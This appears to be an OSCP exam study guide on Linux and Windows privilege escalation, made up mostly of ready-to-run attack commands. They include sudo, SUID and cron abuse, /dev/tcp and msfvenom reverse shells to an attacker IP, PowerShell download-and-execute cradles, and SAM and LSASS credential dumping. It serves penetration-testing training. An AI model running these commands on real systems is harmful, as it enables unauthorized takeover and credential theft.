# OSCP+ KNOWLEDGE BASE — VOLUME 4
## BECOMING ROOT / SYSTEM: PRIVILEGE ESCALATION (Linux & Windows)

> **Read this box first.**
> "Privilege escalation" ("privesc") = you have a shell as a *normal* user, and you want to become the *all-powerful* user. On **Linux** that top user is **root**. On **Windows** it's **SYSTEM** (or a local Administrator). The final flag (`proof.txt`) almost always requires it.
>
> **The mindset:** you don't "hack" your way to root — you find something the admin *misconfigured* (a program you're allowed to run as root, a script root runs that you can edit, a password left in a file) and abuse it. So privesc = **enumerate thoroughly, then spot the one thing that's wrong.**
>
> **Two best friends:**
> - **GTFOBins** (gtfobins.github.io) — for Linux: look up any program you're allowed to run elevated; it tells you the exact escape.
> - **LOLBAS** (lolbas-project.github.io) — the Windows equivalent.
>
> Placeholders: `<IP>` = **your Kali** IP (for reverse shells / file serving). `$IP` = the target. `<you>` = your current username on the target.

---

# [LINUX-PRIVESC]  getting root on Linux

## [LINUX-PRIVESC-QUICK]  first 60 seconds on any Linux shell  (one screen)
```bash
id ; sudo -l ; hostname ; uname -a                    # [MUST-MEMORIZE] who am I, what can I sudo, which kernel
#   id      = your user + groups (are you in 'sudo', 'docker', 'lxd'? those are shortcuts to root)
#   sudo -l = what you're allowed to run as root (the #1 quick win — check this FIRST)
#   uname -a= kernel version (only for kernel exploits, which are a LAST resort)
find / -perm -4000 -type f 2>/dev/null                # find "SUID" programs (run as their owner — often root)
find / -writable -type d 2>/dev/null | head           # folders you can write to
cat /etc/crontab ; ls -la /etc/cron.*                 # scheduled jobs (a root job you can tamper with = win)
getcap -r / 2>/dev/null                               # "capabilities" (special powers on specific programs)
ls -la /home/* ; cat ~/.bash_history ; ls -la ~/.ssh  # loot: other users, past commands, SSH keys
ss -tlnp ; cat /etc/passwd                            # internal-only services + the user list
# then let a script do the heavy lifting:
./linpeas.sh | tee linpeas.txt
```
**Check these in order (easiest wins first):** `sudo -l` → SUID/GTFOBins → a writable cron/script → capabilities → creds in files → **kernel exploit (only as a last resort — it can crash the box)**.

## [LINPEAS-WORKFLOW]  using the automated enumerator
1. Get it onto the target and run it: `curl http://<IP>/linpeas.sh | sh`, or download it, `chmod +x linpeas.sh`, `./linpeas.sh`. Save the output with `| tee linpeas.txt`.
2. **Read the RED/YELLOW highlights first** — RED+YELLOW together = "this is very likely your way up."
3. **Don't trust it blindly** — linpeas misses things and also flags harmless noise. Confirm each candidate by hand before exploiting.
4. Prioritise these sections: "Interesting writable files", "SUID", "Sudo", "Capabilities", "Cron", "Passwords/creds", "Software with known exploits".
- **Quieter alternative — `lse.sh` (linux-smart-enumeration):** if linpeas is overwhelming, run `./lse.sh -l1` (only interesting findings) then `-l2` (everything). It's also read-only and exam-legal — a good second opinion.

## [GTFOBINS-WORKFLOW]  how to actually use GTFOBins
- Any program that shows up in `sudo -l`, or as a SUID binary, or with a capability → look its name up on **GTFOBins**.
- Pick the section that matches *your* case — **Sudo**, **SUID**, or **Capabilities** — and copy the exact escape it gives.
- The mental test: does this program let me **run a command**, **read a file**, **write a file**, or **spawn a shell** as the elevated user? If any of those → you win.

## [LINUX-SUDO]  abusing `sudo` rights
**What it is:** `sudo` lets you run specific commands as root. If you're allowed to run the *wrong* command, you can turn it into a full root shell.
**Detect:** `sudo -l`.
**Read the output:** `(ALL) NOPASSWD: /path/bin` = you can run that as root with no password. `(root) ALL` = full root already. `env_keep`/`LD_PRELOAD` present = an environment-hijack trick is possible. If it's a **script you can edit** = instant win.
**Exploit:**
- Look the allowed program up on **GTFOBins** (Sudo section). Examples: `sudo find . -exec /bin/sh \; -quit` · `sudo vim -c ':!/bin/sh'` · `sudo less` then `!sh` · `sudo awk 'BEGIN{system("/bin/sh")}'` · `sudo env /bin/sh`.
- `(ALL) NOPASSWD: /usr/bin/python3` → `sudo python3 -c 'import os;os.system("/bin/sh")'`.
- **LD_PRELOAD** (when `env_keep+=LD_PRELOAD` is set): compile a tiny malicious `.so` library whose startup code spawns a shell → `sudo LD_PRELOAD=/tmp/x.so <allowed cmd>`.
- An editable script that runs as root → insert a reverse shell, or `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`.
- Specific vulnerable sudo versions: **CVE-2021-3156 (Baron Samedit)**, **CVE-2019-14287 (`sudo -u#-1`)** `[LOOK-UP]`.
**Verify:** `id` shows `uid=0(root)`, or run `bash -p` after making a SUID bash.
**Not a vector if:** the allowed program has no GTFOBins escape and no input you can tamper with.

## [LINUX-SUID] / SGID  abusing SUID programs
**What it is:** a "SUID" program always runs as its *owner*, no matter who launches it. If a root-owned SUID program can be made to run your commands, you become root.
**Detect:** `find / -perm -4000 -type f 2>/dev/null` (SUID); use `-2000` for SGID.
**Read it:** ignore the normal ones (`ping`, `su`, `sudo`, `mount`, `passwd`, `pkexec`) — look for **unusual** or **custom** programs, and known tools that have a GTFOBins entry.
**Exploit:**
- GTFOBins SUID section (e.g. `find`, old `nmap --interactive`, `bash -p`, `cp`, `env`, `python` if it's SUID).
- **A custom SUID binary:** run `strings` / `ltrace` on it — it often calls another program **without a full path** → hijack it via PATH (`[LINUX-PATH]`), or it calls `system("service …")` → hijack that.
- `pkexec` present → **PwnKit / CVE-2021-4034** (extremely common on older boxes) `[LOOK-UP]`.
**Verify:** `bash -p` (the `-p` keeps the elevated privileges) then `id`.
**Not a vector if:** the binary drops its privileges internally or has nothing you can influence.

## [LINUX-CAP]  Linux capabilities
**What it is:** "capabilities" are slivers of root power granted to a single program. The dangerous ones let a program change its user ID or read/write any file.
**Detect:** `getcap -r / 2>/dev/null`.
**Read it:** `cap_setuid+ep` on python/perl = instant root. `cap_dac_read_search` = read any file (e.g. `/etc/shadow`). `cap_dac_override` = write any file.
**Exploit (`cap_setuid` → root):**
```bash
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'              # if python has cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'     # if perl does
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit         # if gdb does
# cap_dac_read_search → read /etc/shadow with that binary → crack root's hash
# cap_dac_override    → overwrite /etc/passwd, a root cron, or sudoers
```
**Verify:** `id` → `uid=0(root)`. Only `cap_setuid`/`cap_setgid`/`cap_dac_*` on a program that **runs code** (python/perl/gdb/ruby) are exploitable; things like `cap_net_raw` on `ping` are not. Look up the exact command on **GTFOBins → Capabilities**.

## [LINUX-CRON]  scheduled jobs (cron)
**What it is:** the system runs certain scripts on a schedule, often as root. If you can edit a script root runs — or write into a folder it uses — your code runs as root.
**Detect:** `cat /etc/crontab`; `ls -la /etc/cron.d /etc/cron.daily`; run **`pspy`** to watch processes live and catch hidden or short-interval jobs.
**Read it:** a script that runs **as root** and is **writable by you** (or lives in a writable folder, or uses a `*` wildcard, or calls a program by short name) = win.
**Exploit:**
- Writable script → append a reverse shell, or `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`.
- **Wildcard injection** (a job like `tar/chown/rsync *` in a folder you can write to): drop files whose *names* are command options — see `[LINUX-WILDCARD]`.
- Calls a program by short name → PATH hijack (`[LINUX-PATH]`).
**Verify:** wait for the interval; catch the shell / use the SUID bash. **Troubleshoot:** confirm it actually runs (`pspy`), and that you can write both the *script* and its *folder*.

## [LINUX-PATH]  PATH hijacking
**What it is:** if a privileged program calls another command by its short name (`service` instead of `/usr/sbin/service`), Linux searches folders in your `$PATH` to find it. Put a fake one earlier in the PATH and yours runs instead.
**Detect:** a SUID/cron/sudo program calls another command by name (find out via `strings` / `ltrace -f ./bin`).
**Exploit:** `echo '/bin/bash -p' > /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH`, then trigger the parent program.
**Verify:** the parent runs your fake as root.

## [LINUX-WILDCARD]  wildcard injection
A cron/script runs `tar czf backup.tar.gz *` (or `chown *`, `rsync *`) in a folder you can write to. Because `*` expands to the filenames, you plant files whose names are actually command-line options:
```bash
cd <dir>
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > x.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'      # next tar run executes x.sh as root → SUID bash
```

## [LINUX-WRITABLE]  writable sensitive files
- Writable `/etc/passwd` → add your own root user:
  `echo 'r00t:$(openssl passwd -1 -salt a pass):0:0::/root:/bin/bash' >> /etc/passwd` then `su r00t` (password: `pass`).
- Writable `/etc/shadow` → replace root's hash with one you know. Writable `/etc/sudoers` (or `sudoers.d`) → grant yourself NOPASSWD. Writable systemd service/unit → root via systemd.

## [LINUX-BASHRC]  writable shell-startup files
**What it is:** files like `~/.bashrc`, `~/.bash_profile`, `~/.profile` (and global ones in `/etc/profile.d/`) run **every time that user opens a shell**. If one belongs to a higher-priv user but is **writable by you**, append a payload and it fires as *them* next time they log in.
```bash
find / \( -name ".bashrc" -o -name ".bash_profile" -o -name ".profile" \) -writable 2>/dev/null
ls -la /etc/profile /etc/bash.bashrc /etc/profile.d/
# if root's file is writable:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /root/.bashrc   # then, after root logs in:  /tmp/rootbash -p
echo 'bash -i >& /dev/tcp/<IP>/443 0>&1' >> /home/<user>/.bashrc              # reverse shell as that user
```
**Also loot** your own and others' `.bashrc`/`.profile` for aliases and `export`ed credentials. (Different from `~/.bash_history`, which is *reading* past commands for creds — `[LINUX-CREDS]`.)

## [LINUX-SYSTEMD]  services / timers
A writable `.service` or `.timer` file, or a root service that points to a binary you can overwrite → edit `ExecStart` to your payload, then `systemctl restart <svc>` (if allowed) or wait for the timer.

## [LINUX-NFS]  no_root_squash
`showmount -e $IP` shows an export with **`no_root_squash`**. On **your own** machine (as root): mount that export, drop in a SUID-root shell binary (compile a tiny C program that does `setuid(0); execl("/bin/bash", ...)`); then on the target, run it as your low-priv user → root.

## [LINUX-DOCKER-LXD]  container / group escapes
- In the **docker** group: `docker run -v /:/mnt -it alpine chroot /mnt sh` → you're root on the host's disk.
- In the **lxd/lxc** group: import an alpine image and launch a privileged container with the host `/` mounted → root `[LOOK-UP]`.
- Inside a container (there's a `/.dockerenv`): check `capsh --print`, mounted host paths, and `/var/run/docker.sock` (→ spawn a privileged container).

## [LINUX-CREDS]  hunting creds & keys (also `[CREDENTIALS-SOURCES]`)
`~/.bash_history`, `~/.ssh/id_*` (reuse across users/hosts), config files with DB creds, `.env`, `/var/www/**`, backups, `find / -name "*.kdbx"` (KeePass), mounted shares, app dirs in `/opt` and `/srv`, `mysql -u root` with a blank password, a `.git` folder in the web root.

## [LINUX-KERNEL]  kernel exploits (LAST resort)
**Detect:** `uname -a`, `/etc/os-release`; `searchsploit linux kernel <ver>`; the tool `linux-exploit-suggester2`.
**Warning:** kernel exploits can **crash the box** (forcing a revert) → only try after you've exhausted everything else. Match the exact kernel + distro + architecture.
**Common ones:** DirtyCOW (old), **DirtyPipe (kernels 5.8–5.16.11)**, PwnKit (pkexec — not the kernel, but nearly universal), OverlayFS variants, Sudo Baron Samedit.

## [LINUX-LOCAL-ENUM]  "check X → run this" table (copy-paste after you get a shell)
```
Who am I          id ; whoami ; groups
OS / kernel       uname -a ; cat /etc/os-release        (→ linux-exploit-suggester)
Users             cat /etc/passwd ; ls -la /home        (accounts with a login shell = real users)
sudo rights       sudo -l                               (the #1 quick win)
SUID / SGID       find / -perm -4000 -type f 2>/dev/null ; find / -perm -2000 -type f 2>/dev/null
Capabilities      getcap -r / 2>/dev/null
Cron / timers     crontab -l ; cat /etc/crontab ; ls -la /etc/cron.* ; systemctl list-timers ; pspy
Running procs     ps aux --forest                       (an unusual process → look in its folder)
Listening ports   ss -tlnp   (or netstat -tulpn)        (127.0.0.1-only = a pivot lead)
Writable stuff    find / -writable -not -path "/proc/*" 2>/dev/null | grep -vE '^/(sys|run|tmp|dev)'
Network           ip a ; ip route ; arp -a
Mounts/creds      mount ; cat /etc/fstab
Loot              ls -la ~/.ssh ; cat ~/.bash_history ; env ; find / -name "*.kdbx" 2>/dev/null
```
**🚩 flag / creds hunt:**
```bash
find / -iname '*flag*' 2>/dev/null
grep -rniE 'flag\{|OS\{|password|secret' /home /var/www /opt /etc 2>/dev/null
```

## [LINUX-PRIVESC-MANUAL]  full manual checklist (when linpeas is unavailable or misses it)
```bash
# 🚩 hunt for a flag / creds anywhere:
find / -iname '*flag*' 2>/dev/null ; grep -rniE 'flag\{|OS\{|password' /home /var/www /opt 2>/dev/null
id; sudo -l; uname -a; cat /etc/os-release       # who am I + sudo rights + kernel/OS (the first 4 checks)
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null   # SUID / SGID → GTFOBins
getcap -r / 2>/dev/null                           # capabilities (cap_setuid on python/perl = root)
cat /etc/crontab; ls -la /etc/cron*; systemctl list-timers   # scheduled jobs (writable = root)
find / -writable -not -path "/proc/*" 2>/dev/null | grep -vE '^/(sys|run|tmp|dev)'   # writable files root touches
cat /etc/passwd; ls -la /home/*; find / -name "*.kdbx" -o -name "id_rsa" 2>/dev/null   # users + SSH/KeePass loot
history; cat ~/.bash_history 2>/dev/null; env     # command history + env vars (passwords leak here)
ss -tlnp; ip a; arp -a                            # internal services / pivot leads
ps aux --forest                                   # root processes → target them (pspy for timing)
mount; cat /etc/fstab                             # nfs/no_root_squash, creds in fstab
```

## [COMMON-RABBIT-HOLES linux-privesc]
- Trying kernel exploits first (they should be *last*). Chasing every SUID (most are standard/harmless). Cracking a hash you don't actually need. Drowning in linpeas noise. A "writable" file that's really in `/proc` or `/tmp` and useless.

---

# [WINDOWS-PRIVESC]  getting SYSTEM on Windows

## [WINDOWS-PRIVESC-QUICK]  first 60 seconds on any Windows shell  (one screen)
```cmd
whoami /all                              :: [MUST-MEMORIZE] your user, groups, AND privileges — all at once
whoami /priv                             :: the privileges list — SeImpersonate? SeBackup? (these are gold)
systeminfo                               :: OS version/build + installed patches (kernel-exploit hints)
net user %username% & net localgroup administrators
cmdkey /list & dir C:\ & net user
:: automate:
.\winPEASx64.exe > wp.txt                :: (or PowerUp / Seatbelt)
```
**Check in order:** `whoami /priv` (SeImpersonate/SeBackup are near-instant wins) → service/registry permissions → unquoted service paths → AlwaysInstallElevated → saved creds → autologon → **kernel (last)**.

## [WINPEAS-WORKFLOW]
1. Transfer winPEAS (`winPEASx64.exe`; use the `.bat` or PowerShell variant if AV blocks the exe). Save the output.
2. Read the RED highlights: privileges, service misconfigs, unquoted paths, AlwaysInstallElevated, stored creds, autologon.
3. Confirm each by hand (winPEAS over-reports on service permissions). Run **PowerUp** (`Invoke-AllChecks`) and/or **Seatbelt** for a second opinion.

## [WINDOWS-TOKENS]  abusing privileges (the fastest wins)  → `[TECH-TOKENS]`
**What it is:** Windows accounts hold "privileges." A few of them can be turned directly into SYSTEM. **Always check `whoami /priv` first** — this is the most common Windows privesc on OSCP.
**Detect:** `whoami /priv`.
**The valuable ones and how to use them:**
- **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege** (common on service accounts, IIS, MSSQL) → a **"Potato"** attack → SYSTEM:
  - `PrintSpoofer64.exe -i -c cmd` (or `-c "nc.exe <IP> 443 -e cmd"`).
  - `GodPotato -cmd "cmd /c whoami"` (modern; works on Server 2012–2022).
  - `JuicyPotatoNG` / `RoguePotato` (older variants) `[LOOK-UP]`.
- **SeBackupPrivilege / SeRestorePrivilege** → read any file: back up the SAM+SYSTEM registry hives (`reg save`) → `secretsdump` → the admin's hash; or copy `NTDS.dit` on a Domain Controller.
- **SeTakeOwnershipPrivilege** → take ownership of a sensitive file/binary → replace it.
- **SeDebugPrivilege** → dump LSASS memory (mimikatz/procdump) → creds.
- **SeLoadDriverPrivilege** → load a vulnerable driver `[LOOK-UP]`.
**Verify:** `whoami` = `nt authority\system` (or a machine account like `secura\dc01$` on a DC — same power, see gotchas).

### [POTATO-GOTCHAS]  when PrintSpoofer/GodPotato "works" but you get nothing (battle-tested)
Real problems you WILL hit, and the exact fixes:
- **`-i` (interactive) fails:** `CreateProcessAsUser() failed... retrying with CreateProcessWithTokenW()` → `[!] CreateProcessWithTokenW() isn't compatible with option -i`. The fallback token method can't spawn an interactive prompt. **FIX:** drop `-i`, use `-c "<command>"` instead (it still runs as SYSTEM).
- **`-c "whoami"` runs but prints NOTHING:** with `CreateProcessWithTokenW`, the child's output doesn't come back to your shell. It *did* run — you just can't see it. **FIX — two options:**
  1. **Reverse shell (best — gives you an interactive SYSTEM shell):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliIP> LPORT=443 -f exe -o sh.exe`, transfer it, then `.\ps.exe -c "C:\path\sh.exe"` → catch it on `nc -lvnp 443`. (If Defender eats the msfvenom exe on a DC, use the file trick below.)
  2. **Redirect the output to a file you can read:** `.\ps.exe -c "cmd /c <command> > C:\Users\<you>\Desktop\o.txt & icacls C:\Users\<you>\Desktop\o.txt /grant <you>:F"` then `type` it. **Write to your OWN profile, not `C:\Users\Public`** — Public often has inherited *deny* rules; the `icacls /grant` makes the SYSTEM-created file readable by you.
- **You become `MACHINE$` instead of `nt authority\system`:** e.g. `secura\dc01$`. On the DC that computer account is SYSTEM-equivalent locally — full access, don't panic.
- **`type C:\Users\Administrator\Desktop\proof.txt` → "cannot find the path":** the admin profile is often renamed **`Administrator.DC01`** (or `Administrator.<DOMAIN>`) on a DC. **FIX:** `dir C:\Users` to see the real names, or hunt: `where /r C:\ proof.txt` → then `type <full path>`.
- **certutil download fails "CANNOT_CONNECT" (0x80072efd):** the URL must point at **YOUR Kali `tun0` IP** with `python3 -m http.server 80` running — never a victim's IP. Get your IP with `ip addr show tun0`.

## [WINDOWS-SERVICES]  service misconfigurations
**What it is:** Windows "services" are background programs, usually running with high privileges. If you can swap the program a service runs, or change its config, your code runs with those privileges.
**Detect:** PowerUp `Invoke-AllChecks`; `accesschk.exe -uwcqv "user" *`; winPEAS.
- **Unquoted service path:** `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"` → a path with spaces, no quotes, and a writable folder along the way. **Exploit:** place `C:\Program.exe` (in the writable segment) → restart the service → it runs as the service account.
- **Writable service binary:** `sc qc <svc>`; if you can overwrite the EXE → replace it with your payload → restart. `sc config <svc> binPath= "C:\temp\rev.exe"` (if you can change config) then `sc start <svc>`.
- **Weak service config permissions:** `sc config <svc> binPath= "cmd /c net localgroup administrators <you> /add"` → `sc stop/start`.
- **DLL hijacking:** a service loads a missing DLL from a writable folder → drop a malicious DLL `[LOOK-UP]`.
**Verify:** a new admin / SYSTEM shell after the restart. **Troubleshoot:** you need restart rights (`sc start` denied → does it auto-restart, or can you `shutdown /r`?); `binPath=` needs a space after the `=`.

## [WINDOWS-REGISTRY]  registry-based
- **AlwaysInstallElevated:** if both `HKLM` and `HKCU` have `...\Installer\AlwaysInstallElevated = 1`, any `.msi` you install runs as SYSTEM.
  ```cmd
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi -o x.msi
  msiexec /quiet /qn /i x.msi
  ```
- **Writable Autorun/Run keys** → drop a payload for the next admin login.
- **Autologon creds:** `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` → `DefaultUserName` / `DefaultPassword` in cleartext.
- **Weak registry service perms** (writable `ImagePath`) → point it at your payload.

## [WINDOWS-CREDS]  credential hunting  → `[CREDENTIALS-SOURCES]`
```cmd
cmdkey /list                          :: saved creds → runas /savecred /user:X cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: autologon password
dir /s /b C:\*unattend.xml C:\*sysprep.inf C:\*.kdbx C:\*.config 2>nul
findstr /si password *.xml *.ini *.txt *.config          :: search a folder of interest for "password"
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
:: with admin — dump hashes:
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM sys.hive
:: then on Kali:  secretsdump.py -sam sam.hive -system sys.hive LOCAL
```
- **runas with a saved cred:** `runas /savecred /user:admin "cmd /c <payload>"`.
- Also: **DPAPI**, **LSASS** (mimikatz `sekurlsa::logonpasswords`, or `procdump -ma lsass.exe` then dump offline), Wi-Fi/vault creds.

## [WINDOWS-STARTUP]  startup / scheduled tasks
- A writable **Startup folder**, or a **scheduled task** that runs as admin with a binary you can overwrite → replace/drop your payload.
- `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"` → find admin tasks with weak binary permissions.

## [WINDOWS-INSTALLED]  installed software (find a vulnerable app)
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s   :: 32-bit apps — don't miss this!
```
Also `dir "C:\Program Files"` and `"C:\Program Files (x86)"`. A vulnerable version → `searchsploit <product> <version>` → local privesc (`[EXPLOIT-RESEARCH]`).

## [WINDOWS-PROCESSES]  running processes — find the non-standard one
```powershell
Get-Process | Select Name,Id,Path | Sort Name
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath,CommandLine   # includes the command line
# surface anything NOT running from C:\Windows (i.e. custom software):
Get-Process | ? { $_.Path -and $_.Path -notlike "C:\Windows\*" } | Select Name,Path
```
**Why:** a process running from `C:\Users\`, `C:\Temp`, `C:\Tools`, or an odd folder = **custom software** → check whether you can overwrite its EXE (→ `[WINDOWS-SERVICES]`) and loot its folder for creds/configs/flags (`Get-ChildItem <dir> -Recurse -Force`). This is the Windows version of Linux's `ps aux --forest`.

## [WINDOWS-KERNEL]  kernel/OS exploits (LAST resort)
**Detect:** `systeminfo` → feed it to **Windows Exploit Suggester** (`wesng`); note missing hotfixes + the build number.
**Common (must match the build):** older systems → MS16-032, MS15-051, MS16-135. Prefer token/service methods first — kernel exploits risk crashing the box.

## [POWERSHELL]  ⚡ the Windows PowerShell commands you actually type
```powershell
# launch flags (prepend to any payload):
powershell -nop -w hidden -ep bypass -c "<command>"    # no-profile, hidden window, bypass execution policy
powershell -enc <base64-UTF16LE>                        # build with: echo -n '<ps>'|iconv -t UTF-16LE|base64 -w0

# download (target pulls from your Kali's python3 -m http.server) → [FILETRANSFER-QUICK]:
IWR http://<IP>/f -OutFile C:\Windows\Temp\f            # Invoke-WebRequest
(New-Object Net.WebClient).DownloadFile('http://<IP>/f','C:\Windows\Temp\f')   # works on OLD PowerShell too
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/x.ps1')   # download + run IN MEMORY (never touches disk)
[Net.ServicePointManager]::SecurityProtocol='Tls12'     # if you get TLS/download errors

# enumerate:
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-Service | ? {$_.Status -eq 'Running'} | Select Name,DisplayName
Get-ScheduledTask | ? {$_.State -eq 'Ready'}
Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue -Include *.kdbx,*.config,*flag*
Select-String -Path C:\Users\*\* -Pattern 'password|OS\{' -List -EA SilentlyContinue

# run as another user / remote (→ [AD-DOUBLEHOP]):
$p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
$c=New-Object System.Management.Automation.PSCredential('DOMAIN\user',$p)
Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }
```
> Reverse shells + `Invoke-ConPtyShell` (a real interactive TTY) are in `[SHELL-WINDOWS]` / `[SHELL-STABILIZE]`.

## [WIN-LOCAL-ENUM]  "check X → run this" table (copy-paste after you get a shell)
```
OS / patches      systeminfo                                   (→ wesng for kernel exploits)
Who am I          whoami /all                                  (user, groups, PRIVILEGES together)
Users / groups    net user | Get-LocalUser ; net localgroup administrators
Privileges        whoami /priv                                 (SeImpersonate? SeBackup?)
Installed apps    reg query "HKLM\...\Uninstall" /s ; +WOW6432Node for 32-bit   [WINDOWS-INSTALLED]
Running processes Get-Process | Select Name,Id,Path            [WINDOWS-PROCESSES]
Services          sc query | Get-Service | wmic service get name,pathname,startmode
Scheduled tasks   schtasks /query /fo LIST /v
Network / ports   netstat -ano | ipconfig /all | route print | arp -a
Stored creds      cmdkey /list | reg query "HKLM\...\Winlogon"      [WINDOWS-CREDS]
PowerShell hist   type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
**🚩 Hunt for a flag / creds anywhere:**
```cmd
dir /s /b C:\*flag*.txt 2>nul
findstr /s /i "OS{ flag password" C:\Users\*.txt 2>nul
```
```powershell
Get-ChildItem C:\ -Recurse -Include *flag*,*.txt -EA SilentlyContinue | Select FullName
Select-String -Path C:\Users\*\* -Pattern 'OS\{|flag\{' -List -EA SilentlyContinue
```

## [WINDOWS-PRIVESC-MANUAL]  checklist
```cmd
whoami /all & whoami /priv & systeminfo & hostname       :: identity + PRIVILEGES + OS build
net user & net localgroup administrators & net accounts  :: local users, admins, password policy
cmdkey /list & reg query "HKLM\...\Winlogon"             :: saved creds + autologon password
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   :: both =1 → .msi as SYSTEM
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\windows"  :: UNQUOTED service paths
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As"   :: admin scheduled tasks
dir /s /b C:\*.config C:\*unattend* C:\*.kdbx 2>nul       :: config/unattend/KeePass → creds
netstat -ano & ipconfig /all & route print & arp -a       :: internal services / other subnets (pivot leads)
```

## [COMMON-RABBIT-HOLES windows-privesc]
- Jumping to kernel exploits before checking `whoami /priv`. Chasing a service you can't restart. Cracking a hash when Pass-the-Hash already works. AV eating your winPEAS.exe (use the PS/bat variant or go manual). An unquoted path where no folder along the way is writable (a false positive).

---
*End Volume 4. Next: Volume 5 — Active Directory (attacking a Windows domain) and pivoting between networks.*
